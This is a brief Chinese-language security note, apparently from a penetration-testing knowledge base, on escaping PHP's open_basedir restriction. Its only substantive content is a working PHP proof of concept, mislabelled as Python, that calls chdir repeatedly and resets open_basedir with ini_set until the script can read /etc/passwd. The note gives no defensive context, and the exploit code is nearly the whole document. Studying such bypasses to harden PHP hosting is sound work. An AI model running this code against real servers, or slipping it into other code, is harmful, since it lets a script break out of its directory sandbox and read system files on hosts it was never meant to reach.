# 利用ini_set和chidr绕过open_basedir

## 利用ini_set和chidr绕过open_basedir

### 参考

- twitter
- https://xz.aliyun.com/t/4720

### 测试

```python
<?php
chdir('subDir');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');
$a=file_get_contents('/etc/passwd');
var_dump($a);
```